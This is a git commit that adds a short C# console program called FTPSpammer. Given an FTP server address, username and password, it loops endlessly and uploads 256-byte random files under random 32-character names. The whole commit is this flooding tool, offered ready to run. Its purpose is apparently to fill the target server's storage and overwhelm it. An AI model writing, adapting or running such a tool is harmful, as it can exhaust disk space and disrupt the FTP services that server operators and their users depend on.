d26e3a1553393b142182a95159362fdf117e8e77
Simon Aarons <40786398+simonmkwii-dev@users.noreply.github.com>
2018-10-12 13:29:00 +1100

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Linq;
+using System.Net;
+using System.Security.Cryptography;
+
+namespace FTPSpammer
+{
+    internal class Program
+    {
+        private static void Main(string[] args)
+        {
+            if (args.Length < 3)
+            {
+                Console.WriteLine("Usage: FTPSpammer.exe <Remote server IP> <Username> <Password>");
+                Environment.Exit(-1);
+            }
+
+            string RandStr(int Len)
+            {
+                var Chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+                return new string(Enumerable.Repeat(Chars, Len).Select(s => s[new Random().Next(s.Length)]).ToArray());
+            }
+
+            while (true)
+            {
+                byte[] Buf = new byte[0x100];
+                new RNGCryptoServiceProvider().GetBytes(Buf);
+                new WebClient{Credentials = new NetworkCredential(args[1], args[2])}.UploadData($"ftp://{args[0]}/{RandStr(32)}", Buf);
+            }
+        }
+    }
+}
